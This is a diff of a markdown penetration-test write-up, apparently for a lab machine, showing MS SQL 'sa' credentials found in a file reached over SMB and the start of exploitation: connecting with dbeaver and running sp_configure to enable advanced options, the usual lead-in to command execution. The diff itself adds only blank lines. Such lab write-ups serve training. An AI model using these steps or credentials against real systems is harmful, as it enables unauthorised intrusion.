@@ -48,6 +48,7 @@ smb: \> ls
 >  A [text version](http://10.11.1.31/login-off.asp.txt) of this file is also accessible through the web.  
 
 5. `login-off.asp` contains credentials for **MS SQL** - the database used by the web app.
+   
 ```
 Username: sa
 Password: poiuytrewq
@@ -56,6 +57,7 @@ Password: poiuytrewq
 ## Exploitation
 1. We established a connection to the **MS SQL Server** using the retrieved credentials and an SQL client named `dbeaver`
 ![[ralph-dbeaver.png]]
+
 2. Using `dbeaver` SQL Editor, we've executed the following commands one by one
 ```
 EXEC sp_configure 'show advanced options',1
